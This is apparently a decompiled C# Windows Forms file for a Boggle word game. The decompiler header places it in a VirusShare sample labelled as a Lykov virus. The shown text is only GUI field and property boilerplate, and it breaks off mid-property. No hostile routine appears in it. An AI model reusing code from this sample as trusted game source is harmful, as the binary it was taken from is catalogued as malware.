// Decompiled with JetBrains decompiler
// Type: Boggle.frmMain
// Assembly: Boggle, Version=1.0.1320.31511, Culture=neutral, PublicKeyToken=null
// MVID: B8BB850A-887A-43B2-B89D-3D1301289D01
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Virus.Win32.Lykov.b-5b4c66fd4c89a7645d7912c18b43ddd7b8db068aa896fea714881ce355eaf833.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.OleDb;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Boggle
{
  public class frmMain : Form
  {
    [AccessedThroughProperty("lbl14")]
    private CircleLabel _lbl14;
    [AccessedThroughProperty("BogBorder10")]
    private BogBorder _BogBorder10;
    [AccessedThroughProperty("lbl13")]
    private CircleLabel _lbl13;
    [AccessedThroughProperty("lbl12")]
    private CircleLabel _lbl12;
    [AccessedThroughProperty("lbl15")]
    private CircleLabel _lbl15;
    [AccessedThroughProperty("lbl11")]
    private CircleLabel _lbl11;
    [AccessedThroughProperty("lbl10")]
    private CircleLabel _lbl10;
    [AccessedThroughProperty("lbl9")]
    private CircleLabel _lbl9;
    [AccessedThroughProperty("lbl8")]
    private CircleLabel _lbl8;
    [AccessedThroughProperty("lbl7")]
    private CircleLabel _lbl7;
    [AccessedThroughProperty("lbl6")]
    private CircleLabel _lbl6;
    [AccessedThroughProperty("lbl16")]
    private CircleLabel _lbl16;
    [AccessedThroughProperty("lbl5")]
    private CircleLabel _lbl5;
    [AccessedThroughProperty("BogBorder11")]
    private BogBorder _BogBorder11;
    [AccessedThroughProperty("btnAddWord")]
    private BogButton _btnAddWord;
    [AccessedThroughProperty("lbl2")]
    private CircleLabel _lbl2;
    [AccessedThroughProperty("lbl3")]
    private CircleLabel _lbl3;
    [AccessedThroughProperty("mnuMain")]
    private MainMenu _mnuMain;
    [AccessedThroughProperty("lbl4")]
    private CircleLabel _lbl4;
    [AccessedThroughProperty("BogBorder12")]
    private BogBorder _BogBorder12;
    [AccessedThroughProperty("lbl1")]
    private CircleLabel _lbl1;
    [AccessedThroughProperty("BogBorder8")]
    private BogBorder _BogBorder8;
    [AccessedThroughProperty("BogBorder13")]
    private BogBorder _BogBorder13;
    [AccessedThroughProperty("BogBorder7")]
    private BogBorder _BogBorder7;
    [AccessedThroughProperty("mnuGame")]
    private MenuItem _mnuGame;
    [AccessedThroughProperty("BogBorder6")]
    private BogBorder _BogBorder6;
    [AccessedThroughProperty("BogBorder14")]
    private BogBorder _BogBorder14;
    [AccessedThroughProperty("BogBorder2")]
    private BogBorder _BogBorder2;
    [AccessedThroughProperty("BogBorder15")]
    private BogBorder _BogBorder15;
    [AccessedThroughProperty("Panel1")]
    private Panel _Panel1;
    [AccessedThroughProperty("mnuNewGame")]
    private MenuItem _mnuNewGame;
    [AccessedThroughProperty("mnuExitGame")]
    private MenuItem _mnuExitGame;
    [AccessedThroughProperty("BogBorder16")]
    private BogBorder _BogBorder16;
    [AccessedThroughProperty("mnuOptions")]
    private MenuItem _mnuOptions;
    [AccessedThroughProperty("txtWordFound")]
    private TextBox _txtWordFound;
    [AccessedThroughProperty("lstHumanWordsFound")]
    private ListBox _lstHumanWordsFound;
    [AccessedThroughProperty("mnuHelp")]
    private MenuItem _mnuHelp;
    [AccessedThroughProperty("tmrContMain")]
    private System.Windows.Forms.Timer _tmrContMain;
    [AccessedThroughProperty("tmrMain")]
    private BogTimer _tmrMain;
    [AccessedThroughProperty("picCubeDown")]
    private PictureBox _picCubeDown;
    [AccessedThroughProperty("lstCompFoundWords")]
    private ListBox _lstCompFoundWords;
    [AccessedThroughProperty("tmrBtn1")]
    private Button _tmrBtn1;
    [AccessedThroughProperty("tmrBtn2")]
    private Button _tmrBtn2;
    [AccessedThroughProperty("tmrBtn3")]
    private Button _tmrBtn3;
    [AccessedThroughProperty("CircleLabel3")]
    private CircleLabel _CircleLabel3;
    [AccessedThroughProperty("CircleLabel2")]
    private CircleLabel _CircleLabel2;
    [AccessedThroughProperty("CircleLabel1")]
    private CircleLabel _CircleLabel1;
    [AccessedThroughProperty("PictureBox1")]
    private PictureBox _PictureBox1;
    [AccessedThroughProperty("picCubesUp")]
    private PictureBox _picCubesUp;
    [AccessedThroughProperty("Label4")]
    private Label _Label4;
    [AccessedThroughProperty("BogBorder1")]
    private BogBorder _BogBorder1;
    [AccessedThroughProperty("Label3")]
    private Label _Label3;
    [AccessedThroughProperty("BogBorder3")]
    private BogBorder _BogBorder3;
    [AccessedThroughProperty("Label2")]
    private Label _Label2;
    [AccessedThroughProperty("BogBorder4")]
    private BogBorder _BogBorder4;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("txtMain")]
    private RichTextBox _txtMain;
    [AccessedThroughProperty("Panel2")]
    private Panel _Panel2;
    [AccessedThroughProperty("tmrBtn4")]
    private Button _tmrBtn4;
    [AccessedThroughProperty("Panel3")]
    private Panel _Panel3;
    [AccessedThroughProperty("BogBorder5")]
    private BogBorder _BogBorder5;
    [AccessedThroughProperty("Label6")]
    private Label _Label6;
    [AccessedThroughProperty("lblRound")]
    private Label _lblRound;
    [AccessedThroughProperty("Label8")]
    private Label _Label8;
    [AccessedThroughProperty("Label7")]
    private Label _Label7;
    [AccessedThroughProperty("lblComputerRounds")]
    private Label _lblComputerRounds;
    [AccessedThroughProperty("Label5")]
    private Label _Label5;
    [AccessedThroughProperty("lblHumanRounds")]
    private Label _lblHumanRounds;
    [AccessedThroughProperty("MenuItem8")]
    private MenuItem _MenuItem8;
    [AccessedThroughProperty("lblHumanScore")]
    private Label _lblHumanScore;
    [AccessedThroughProperty("mnuHighScores")]
    private MenuItem _mnuHighScores;
    [AccessedThroughProperty("lblCompScore")]
    private Label _lblCompScore;
    [AccessedThroughProperty("lblHumanWordsCount")]
    private Label _lblHumanWordsCount;
    [AccessedThroughProperty("lblCompWordsCount")]
    private Label _lblCompWordsCount;
    [AccessedThroughProperty("mnuTips")]
    private MenuItem _mnuTips;
    [AccessedThroughProperty("pnlCubes")]
    private BogPanel _pnlCubes;
    [AccessedThroughProperty("pnlTimer")]
    private BogPanel _pnlTimer;
    [AccessedThroughProperty("pnlScore")]
    private BogPanel _pnlScore;
    [AccessedThroughProperty("MenuItem6")]
    private MenuItem _MenuItem6;
    [AccessedThroughProperty("btnFinish")]
    private BogButton _btnFinish;
    [AccessedThroughProperty("pnlWords")]
    private BogPanel _pnlWords;
    [AccessedThroughProperty("mnuEnableWordValidation")]
    private MenuItem _mnuEnableWordValidation;
    [AccessedThroughProperty("MenuItem5")]
    private MenuItem _MenuItem5;
    [AccessedThroughProperty("btnScramble")]
    private BogButton _btnScramble;
    [AccessedThroughProperty("mnuMode")]
    private MenuItem _mnuMode;
    [AccessedThroughProperty("btnContinue")]
    private BogButton _btnContinue;
    [AccessedThroughProperty("mnuEnableTimerFlash")]
    private MenuItem _mnuEnableTimerFlash;
    [AccessedThroughProperty("mnuTmr500")]
    private MenuItem _mnuTmr500;
    [AccessedThroughProperty("mnuBoardGameMode")]
    private MenuItem _mnuBoardGameMode;
    [AccessedThroughProperty("mnuTmr430")]
    private MenuItem _mnuTmr430;
    [AccessedThroughProperty("mnuTmr400")]
    private MenuItem _mnuTmr400;
    [AccessedThroughProperty("mnuTmr330")]
    private MenuItem _mnuTmr330;
    [AccessedThroughProperty("mnuTmr300")]
    private MenuItem _mnuTmr300;
    [AccessedThroughProperty("mnuVsMode")]
    private MenuItem _mnuVsMode;
    [AccessedThroughProperty("mnuTmr230")]
    private MenuItem _mnuTmr230;
    [AccessedThroughProperty("mnuTmr200")]
    private MenuItem _mnuTmr200;
    [AccessedThroughProperty("mnuTmr130")]
    private MenuItem _mnuTmr130;
    [AccessedThroughProperty("BogBorder9")]
    private BogBorder _BogBorder9;
    [AccessedThroughProperty("mnuTeachingMode")]
    private MenuItem _mnuTeachingMode;
    [AccessedThroughProperty("mnuTmr100")]
    private MenuItem _mnuTmr100;
    [AccessedThroughProperty("mnuTmr30")]
    private MenuItem _mnuTmr30;
    [AccessedThroughProperty("mnuTimerInterval")]
    private MenuItem _mnuTimerInterval;
    [AccessedThroughProperty("mnuEndGame")]
    private MenuItem _mnuEndGame;
    [AccessedThroughProperty("MenuItem4")]
    private MenuItem _MenuItem4;
    [AccessedThroughProperty("mnuLevelImpossible")]
    private MenuItem _mnuLevelImpossible;
    [AccessedThroughProperty("mnuLevelHard")]
    private MenuItem _mnuLevelHard;
    [AccessedThroughProperty("mnuLevelMedium")]
    private MenuItem _mnuLevelMedium;
    [AccessedThroughProperty("MenuItem2")]
    private MenuItem _MenuItem2;
    [AccessedThroughProperty("mnuLevelEasy")]
    private MenuItem _mnuLevelEasy;
    [AccessedThroughProperty("MenuItem3")]
    private MenuItem _MenuItem3;
    [AccessedThroughProperty("mnuAbout")]
    private MenuItem _mnuAbout;
    [AccessedThroughProperty("MenuItem1")]
    private MenuItem _MenuItem1;
    [AccessedThroughProperty("mnuEnableDefSearch")]
    private MenuItem _mnuEnableDefSearch;
    private IContainer components;
    public DataTable FoundWords;
    public string[] WordsChosen;
    public Thread ShowWordThread;
    public Thread ShowTextThread;
    public Thread FindWordsThread;
    public double ScramSec;
    public bool LoadTextShown;
    public int Min;
    public double Sec;
    public int Round;
    public int ComputerRounds;
    public int HumanRounds;
    public int HumanScore;
    public int ComputerScore;
    [SpecialName]
    private bool \u0024STATIC\u0024tmrContMain_Tick\u002420211C1211\u0024TimerGoing;
    [SpecialName]
    private bool[,] \u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection;
    [SpecialName]
    private int \u0024STATIC\u0024tmrContMain_Tick\u002420211C1211\u0024LoadWaitTime;
    [SpecialName]
    private StaticLocalInitFlag \u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection\u0024Init;

    [STAThread]
    public static void Main() => Application.Run((Form) new frmMain());

    internal virtual Label Label1
    {
      get => this._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label1 == null)
          ;
        this._Label1 = value;
        if (this._Label1 == null)
          ;
      }
    }

    internal virtual Label Label2
    {
      get => this._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label2 == null)
          ;
        this._Label2 = value;
        if (this._Label2 == null)
          ;
      }
    }

    internal virtual Label Label3
    {
      get => this._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label3 == null)
          ;
        this._Label3 = value;
        if (this._Label3 == null)
          ;
      }
    }

    internal virtual Label Label4
    {
      get => this._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label4 == null)
          ;
        this._Label4 = value;
        if (this._Label4 == null)
          ;
      }
    }

    internal virtual PictureBox PictureBox1
    {
      get => this._PictureBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._PictureBox1 == null)
          ;
        this._PictureBox1 = value;
        if (this._PictureBox1 == null)
          ;
      }
    }

    internal virtual Label Label5
    {
      get => this._Label5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label5 == null)
          ;
        this._Label5 = value;
        if (this._Label5 == null)
          ;
      }
    }

    internal virtual BogBorder BogBorder2
    {
      get => this._BogBorder2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder2 == null)
          ;
        this._BogBorder2 = value;
        if (this._BogBorder2 == null)
          ;
      }
    }

    internal virtual BogBorder BogBorder6
    {
      get => this._BogBorder6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder6 == null)
          ;
        this._BogBorder6 = value;
        if (this._BogBorder6 == null)
          ;
      }
    }

    internal virtual BogBorder BogBorder7
    {
      get => this._BogBorder7;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder7 == null)
          ;
        this._BogBorder7 = value;
        if (this._BogBorder7 == null)
          ;
      }
    }

    internal virtual BogBorder BogBorder8
    {
      get => this._BogBorder8;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder8 == null)
          ;
        this._BogBorder8 = value;
        if (this._BogBorder8 == null)
          ;
      }
    }

    internal virtual CircleLabel lbl1
    {
      get => this._lbl1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl1 != null)
          this._lbl1.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl1 = value;
        if (this._lbl1 == null)
          return;
        this._lbl1.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel lbl4
    {
      get => this._lbl4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl4 != null)
          this._lbl4.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl4 = value;
        if (this._lbl4 == null)
          return;
        this._lbl4.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel lbl3
    {
      get => this._lbl3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl3 != null)
          this._lbl3.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl3 = value;
        if (this._lbl3 == null)
          return;
        this._lbl3.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel CircleLabel3
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._CircleLabel3 == null)
          ;
        this._CircleLabel3 = value;
        if (this._CircleLabel3 == null)
          ;
      }
      get => this._CircleLabel3;
    }

    internal virtual CircleLabel lbl2
    {
      get => this._lbl2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl2 != null)
          this._lbl2.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl2 = value;
        if (this._lbl2 == null)
          return;
        this._lbl2.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel lbl5
    {
      get => this._lbl5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl5 != null)
          this._lbl5.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl5 = value;
        if (this._lbl5 == null)
          return;
        this._lbl5.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel lbl6
    {
      get => this._lbl6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl6 != null)
          this._lbl6.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl6 = value;
        if (this._lbl6 == null)
          return;
        this._lbl6.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel lbl7
    {
      get => this._lbl7;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl7 != null)
          this._lbl7.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl7 = value;
        if (this._lbl7 == null)
          return;
        this._lbl7.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel CircleLabel2
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._CircleLabel2 == null)
          ;
        this._CircleLabel2 = value;
        if (this._CircleLabel2 == null)
          ;
      }
      get => this._CircleLabel2;
    }

    internal virtual CircleLabel lbl8
    {
      get => this._lbl8;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl8 != null)
          this._lbl8.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl8 = value;
        if (this._lbl8 == null)
          return;
        this._lbl8.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel lbl9
    {
      get => this._lbl9;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl9 != null)
          this._lbl9.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl9 = value;
        if (this._lbl9 == null)
          return;
        this._lbl9.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel lbl10
    {
      get => this._lbl10;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl10 != null)
          this._lbl10.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl10 = value;
        if (this._lbl10 == null)
          return;
        this._lbl10.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel CircleLabel1
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._CircleLabel1 == null)
          ;
        this._CircleLabel1 = value;
        if (this._CircleLabel1 == null)
          ;
      }
      get => this._CircleLabel1;
    }

    internal virtual CircleLabel lbl11
    {
      get => this._lbl11;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl11 != null)
          this._lbl11.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl11 = value;
        if (this._lbl11 == null)
          return;
        this._lbl11.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel lbl12
    {
      get => this._lbl12;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl12 != null)
          this._lbl12.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl12 = value;
        if (this._lbl12 == null)
          return;
        this._lbl12.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel lbl13
    {
      get => this._lbl13;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl13 != null)
          this._lbl13.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl13 = value;
        if (this._lbl13 == null)
          return;
        this._lbl13.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual PictureBox picCubesUp
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._picCubesUp != null)
          this._picCubesUp.Paint -= new PaintEventHandler(this.picCubesUp_Paint);
        this._picCubesUp = value;
        if (this._picCubesUp == null)
          return;
        this._picCubesUp.Paint += new PaintEventHandler(this.picCubesUp_Paint);
      }
      get => this._picCubesUp;
    }

    internal virtual CircleLabel lbl14
    {
      get => this._lbl14;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl14 != null)
          this._lbl14.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl14 = value;
        if (this._lbl14 == null)
          return;
        this._lbl14.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel lbl15
    {
      get => this._lbl15;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl15 != null)
          this._lbl15.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl15 = value;
        if (this._lbl15 == null)
          return;
        this._lbl15.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual CircleLabel lbl16
    {
      get => this._lbl16;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lbl16 != null)
          this._lbl16.CubeClick -= new CircleLabel.CubeClickEventHandler(this.CubeClick);
        this._lbl16 = value;
        if (this._lbl16 == null)
          return;
        this._lbl16.CubeClick += new CircleLabel.CubeClickEventHandler(this.CubeClick);
      }
    }

    internal virtual BogButton btnAddWord
    {
      get => this._btnAddWord;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._btnAddWord != null)
          this._btnAddWord.Click -= new EventHandler(this.btnAddWord_Click);
        this._btnAddWord = value;
        if (this._btnAddWord == null)
          return;
        this._btnAddWord.Click += new EventHandler(this.btnAddWord_Click);
      }
    }

    internal virtual BogBorder BogBorder1
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder1 == null)
          ;
        this._BogBorder1 = value;
        if (this._BogBorder1 == null)
          ;
      }
      get => this._BogBorder1;
    }

    internal virtual MainMenu mnuMain
    {
      get => this._mnuMain;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuMain == null)
          ;
        this._mnuMain = value;
        if (this._mnuMain == null)
          ;
      }
    }

    internal virtual MenuItem mnuGame
    {
      get => this._mnuGame;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuGame == null)
          ;
        this._mnuGame = value;
        if (this._mnuGame == null)
          ;
      }
    }

    internal virtual MenuItem mnuNewGame
    {
      get => this._mnuNewGame;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuNewGame != null)
          this._mnuNewGame.Click -= new EventHandler(this.mnuNewGame_Click);
        this._mnuNewGame = value;
        if (this._mnuNewGame == null)
          return;
        this._mnuNewGame.Click += new EventHandler(this.mnuNewGame_Click);
      }
    }

    internal virtual BogBorder BogBorder3
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder3 == null)
          ;
        this._BogBorder3 = value;
        if (this._BogBorder3 == null)
          ;
      }
      get => this._BogBorder3;
    }

    internal virtual MenuItem mnuExitGame
    {
      get => this._mnuExitGame;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuExitGame != null)
          this._mnuExitGame.Click -= new EventHandler(this.mnuExitGame_Click);
        this._mnuExitGame = value;
        if (this._mnuExitGame == null)
          return;
        this._mnuExitGame.Click += new EventHandler(this.mnuExitGame_Click);
      }
    }

    internal virtual MenuItem mnuOptions
    {
      get => this._mnuOptions;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuOptions == null)
          ;
        this._mnuOptions = value;
        if (this._mnuOptions == null)
          ;
      }
    }

    internal virtual MenuItem mnuHelp
    {
      get => this._mnuHelp;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuHelp == null)
          ;
        this._mnuHelp = value;
        if (this._mnuHelp == null)
          ;
      }
    }

    internal virtual BogBorder BogBorder4
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder4 == null)
          ;
        this._BogBorder4 = value;
        if (this._BogBorder4 == null)
          ;
      }
      get => this._BogBorder4;
    }

    internal virtual System.Windows.Forms.Timer tmrContMain
    {
      get => this._tmrContMain;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._tmrContMain != null)
          this._tmrContMain.Tick -= new EventHandler(this.tmrContMain_Tick);
        this._tmrContMain = value;
        if (this._tmrContMain == null)
          return;
        this._tmrContMain.Tick += new EventHandler(this.tmrContMain_Tick);
      }
    }

    internal virtual BogTimer tmrMain
    {
      get => this._tmrMain;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._tmrMain == null)
          ;
        this._tmrMain = value;
        if (this._tmrMain == null)
          ;
      }
    }

    internal virtual PictureBox picCubeDown
    {
      get => this._picCubeDown;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._picCubeDown == null)
          ;
        this._picCubeDown = value;
        if (this._picCubeDown == null)
          ;
      }
    }

    internal virtual ListBox lstHumanWordsFound
    {
      get => this._lstHumanWordsFound;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lstHumanWordsFound != null)
          this._lstHumanWordsFound.MouseUp -= new MouseEventHandler(this.lstHumanWordsFound_MouseUp);
        this._lstHumanWordsFound = value;
        if (this._lstHumanWordsFound == null)
          return;
        this._lstHumanWordsFound.MouseUp += new MouseEventHandler(this.lstHumanWordsFound_MouseUp);
      }
    }

    internal virtual RichTextBox txtMain
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._txtMain == null)
          ;
        this._txtMain = value;
        if (this._txtMain == null)
          ;
      }
      get => this._txtMain;
    }

    internal virtual TextBox txtWordFound
    {
      get => this._txtWordFound;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._txtWordFound != null)
          this._txtWordFound.KeyPress -= new KeyPressEventHandler(this.txtWordFound_KeyPress);
        this._txtWordFound = value;
        if (this._txtWordFound == null)
          return;
        this._txtWordFound.KeyPress += new KeyPressEventHandler(this.txtWordFound_KeyPress);
      }
    }

    internal virtual Panel Panel1
    {
      get => this._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Panel1 == null)
          ;
        this._Panel1 = value;
        if (this._Panel1 == null)
          ;
      }
    }

    internal virtual BogBorder BogBorder9
    {
      get => this._BogBorder9;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder9 == null)
          ;
        this._BogBorder9 = value;
        if (this._BogBorder9 == null)
          ;
      }
    }

    internal virtual Panel Panel2
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Panel2 == null)
          ;
        this._Panel2 = value;
        if (this._Panel2 == null)
          ;
      }
      get => this._Panel2;
    }

    internal virtual BogBorder BogBorder10
    {
      get => this._BogBorder10;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder10 == null)
          ;
        this._BogBorder10 = value;
        if (this._BogBorder10 == null)
          ;
      }
    }

    internal virtual BogBorder BogBorder11
    {
      get => this._BogBorder11;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder11 == null)
          ;
        this._BogBorder11 = value;
        if (this._BogBorder11 == null)
          ;
      }
    }

    internal virtual BogBorder BogBorder12
    {
      get => this._BogBorder12;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder12 == null)
          ;
        this._BogBorder12 = value;
        if (this._BogBorder12 == null)
          ;
      }
    }

    internal virtual Panel Panel3
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Panel3 == null)
          ;
        this._Panel3 = value;
        if (this._Panel3 == null)
          ;
      }
      get => this._Panel3;
    }

    internal virtual BogBorder BogBorder13
    {
      get => this._BogBorder13;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder13 == null)
          ;
        this._BogBorder13 = value;
        if (this._BogBorder13 == null)
          ;
      }
    }

    internal virtual BogBorder BogBorder14
    {
      get => this._BogBorder14;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder14 == null)
          ;
        this._BogBorder14 = value;
        if (this._BogBorder14 == null)
          ;
      }
    }

    internal virtual BogBorder BogBorder15
    {
      get => this._BogBorder15;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder15 == null)
          ;
        this._BogBorder15 = value;
        if (this._BogBorder15 == null)
          ;
      }
    }

    internal virtual BogBorder BogBorder16
    {
      get => this._BogBorder16;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder16 == null)
          ;
        this._BogBorder16 = value;
        if (this._BogBorder16 == null)
          ;
      }
    }

    internal virtual BogBorder BogBorder5
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._BogBorder5 == null)
          ;
        this._BogBorder5 = value;
        if (this._BogBorder5 == null)
          ;
      }
      get => this._BogBorder5;
    }

    internal virtual ListBox lstCompFoundWords
    {
      get => this._lstCompFoundWords;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lstCompFoundWords != null)
          this._lstCompFoundWords.MouseUp -= new MouseEventHandler(this.lstCompFoundWords_MouseUp);
        this._lstCompFoundWords = value;
        if (this._lstCompFoundWords == null)
          return;
        this._lstCompFoundWords.MouseUp += new MouseEventHandler(this.lstCompFoundWords_MouseUp);
      }
    }

    internal virtual Button tmrBtn1
    {
      get => this._tmrBtn1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._tmrBtn1 != null)
          this._tmrBtn1.Click -= new EventHandler(this.tmrBtn1_Click_1);
        this._tmrBtn1 = value;
        if (this._tmrBtn1 == null)
          return;
        this._tmrBtn1.Click += new EventHandler(this.tmrBtn1_Click_1);
      }
    }

    internal virtual Button tmrBtn2
    {
      get => this._tmrBtn2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._tmrBtn2 != null)
          this._tmrBtn2.Click -= new EventHandler(this.tmrBtn1_Click_1);
        this._tmrBtn2 = value;
        if (this._tmrBtn2 == null)
          return;
        this._tmrBtn2.Click += new EventHandler(this.tmrBtn1_Click_1);
      }
    }

    internal virtual Label Label6
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label6 == null)
          ;
        this._Label6 = value;
        if (this._Label6 == null)
          ;
      }
      get => this._Label6;
    }

    internal virtual Button tmrBtn3
    {
      get => this._tmrBtn3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._tmrBtn3 != null)
          this._tmrBtn3.Click -= new EventHandler(this.tmrBtn1_Click_1);
        this._tmrBtn3 = value;
        if (this._tmrBtn3 == null)
          return;
        this._tmrBtn3.Click += new EventHandler(this.tmrBtn1_Click_1);
      }
    }

    internal virtual Button tmrBtn4
    {
      get => this._tmrBtn4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._tmrBtn4 != null)
          this._tmrBtn4.Click -= new EventHandler(this.tmrBtn1_Click_1);
        this._tmrBtn4 = value;
        if (this._tmrBtn4 == null)
          return;
        this._tmrBtn4.Click += new EventHandler(this.tmrBtn1_Click_1);
      }
    }

    internal virtual Label lblHumanScore
    {
      get => this._lblHumanScore;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lblHumanScore == null)
